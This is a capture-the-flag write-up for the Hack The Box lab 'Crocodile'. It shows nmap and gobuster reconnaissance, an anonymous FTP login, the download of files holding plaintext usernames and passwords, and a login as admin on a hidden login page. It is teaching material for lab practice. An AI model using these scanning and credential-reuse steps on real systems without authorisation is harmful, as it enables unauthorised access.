# Crocodile
#HTB #very-easy #ftp #Web #gobuster #networks-services #authentication
## Target:
*Name:* Crocodile

*IP:*  10.129.128.254
## Vulnerability:
Anonymous login was enabled on the FTP service, allowing access to files containing plaintext usernames and passwords.
## Steps:
#### 1) Reconnaissance
Used nmap to check for open ports, and used `-sC` option to run default nmap scripts:
**Code:**
```
nmap -sV -sC 10.129.128.254
```
**Result**
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-30 08:08 -0400
Nmap scan report for 10.129.128.254
Host is up (0.024s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.37
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.57 seconds
```
The target is running `HTTP` and `FTP` services. We will investigate both of them.
#### 2) Connecting to the FTP service
**Code:**
```
ftp -a 10.129.128.254
```
**Result:**
```
Connected to 10.129.128.254.
220 (vsFTPd 3.0.3)
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
#### 3) Checking available files on the FTP server
We can use the `get` command to download files from the FTP server to our machine.
**Process:**
The nmap scan revealed the presence of the following files:
```
-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
226 Directory send OK.
```
The server contains two interesting files: `allowed.userlist` and `allowed.userlist.passwd`. They may contain usernames and passwords for the web application. 
```
ftp> get allowed.userlist
local: allowed.userlist remote: allowed.userlist
229 Entering Extended Passive Mode (|||48366|)
150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
100% |******************************************************************************************************************************************************|    33       12.10 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (1.69 KiB/s)

ftp> get allowed.userlist.passwd
local: allowed.userlist.passwd remote: allowed.userlist.passwd
229 Entering Extended Passive Mode (|||42791|)
150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
100% |******************************************************************************************************************************************************|    62        1.46 KiB/s    00:00 ETA
226 Transfer complete.
62 bytes received in 00:00 (1.00 KiB/s)
```
#### 4) Viewing the downloaded files
**allowed.userlist:**
```
┌──(___________)-[~]
└─$ cat allowed.userlist       
aron
pwnmeow
egotisticalsw
admin
```
**allowed.userlist.passwd:**
```
┌──(__________)-[~]
└─$ cat allowed.userlist.passwd
root
Supersecretpassword1
@BaASD&9032123sADS
rKXM59ESxesUFHAd
```
#### 5) Login to the web application
We can try the credentials by matching each username with its corresponding password.

But there is no visible login page on the home page:
<img width="2559" height="1366" alt="image" src="https://github.com/user-attachments/assets/bbb3788c-a9f3-4564-84e0-17d67209475d" />

We'll use Gobuster to discover hidden pages: 
**Code:**
```
gobuster dir -u http://10.129.128.254 -w /usr/share/wordlists/dirb/common.txt -x php
```
**Result:**
```
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.128.254
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 279]
.htaccess            (Status: 403) [Size: 279]
.hta.php             (Status: 403) [Size: 279]
.htaccess.php        (Status: 403) [Size: 279]
.htpasswd            (Status: 403) [Size: 279]
.htpasswd.php        (Status: 403) [Size: 279]
assets               (Status: 301) [Size: 317] [--> http://10.129.128.254/assets/]
config.php           (Status: 200) [Size: 0]
css                  (Status: 301) [Size: 314] [--> http://10.129.128.254/css/]
dashboard            (Status: 301) [Size: 320] [--> http://10.129.128.254/dashboard/]
fonts                (Status: 301) [Size: 316] [--> http://10.129.128.254/fonts/]
index.html           (Status: 200) [Size: 58565]
js                   (Status: 301) [Size: 313] [--> http://10.129.128.254/js/]
login.php            (Status: 200) [Size: 1577]
logout.php           (Status: 302) [Size: 0] [--> login.php]
server-status        (Status: 403) [Size: 279]
Progress: 9226 / 9226 (100.00%)
===============================================================
Finished
===============================================================
```
We found the `login.php` page, which we can access on the browser using the URL `http://10.129.128.254/login.php`.
<img width="2559" height="1047" alt="image" src="https://github.com/user-attachments/assets/246013a6-63b1-4e89-bcbf-d17f7b00dba7" />

Using the username `admin` and the password `rKXM59ESxesUFHAd`, we successfully logged in to the application:
<img width="1600" height="848" alt="image" src="https://github.com/user-attachments/assets/c9f5416a-ecf3-4dbb-a351-ceb03e89e307" />

## Flag:
[Not disclosed — solve it yourself!]
## Key takeaway:
- Files stored on FTP servers may contain sensitive information such as usernames and passwords.
- If a web application does not expose a login page, directory enumeration tools like Gobuster can help discover hidden pages.
